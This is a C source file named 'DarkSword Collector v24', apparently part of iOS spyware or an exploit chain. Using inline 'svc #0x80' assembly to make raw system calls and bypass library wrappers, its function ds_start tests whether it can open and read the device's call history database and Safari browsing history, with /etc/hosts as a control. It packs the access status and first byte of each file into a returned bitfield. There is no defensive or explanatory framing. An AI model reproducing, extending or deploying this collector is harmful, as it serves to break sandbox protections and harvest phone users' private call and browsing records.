/**
 * DarkSword Collector v24 - Fixed encoding
 * Per file: status(2 bits) at bits fi*10+0, byte(8 bits) at bits fi*10+2
 * fi=0: CallHistory, fi=1: Safari, fi=2: /etc/hosts (control)
 */

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory");
    return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory");
    return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory");
    return x0;
}

#define SYS_open  5
#define SYS_read  3
#define SYS_close 6

/* Returns status (0=denied, 1=open_only, 3=read_ok) and writes byte to *out */
static int _read1(const char *path, unsigned char *out) {
    *out = 0;
    int fd = (int)_svc2(SYS_open, (long)path, 0);
    if (fd < 0) return 0;
    int n = (int)_svc3(SYS_read, fd, (long)out, 1);
    _svc1(SYS_close, fd);
    return (n > 0) ? 3 : 1;
}

int ds_start(void) {
    unsigned char ch;
    int s, result = 0;

    /* fi=0: CallHistory */
    s = _read1("/var/mobile/Library/CallHistoryDB/CallHistory.storedata", &ch);
    result |= (s & 3) | (((int)ch & 0xFF) << 2);

    /* fi=1: Safari */
    s = _read1("/var/mobile/Library/Safari/History.db", &ch);
    result |= ((s & 3) << 10) | (((int)ch & 0xFF) << 12);

    /* fi=2: /etc/hosts (control) */
    s = _read1("/etc/hosts", &ch);
    result |= ((s & 3) << 20) | (((int)ch & 0xFF) << 22);

    return result;
}
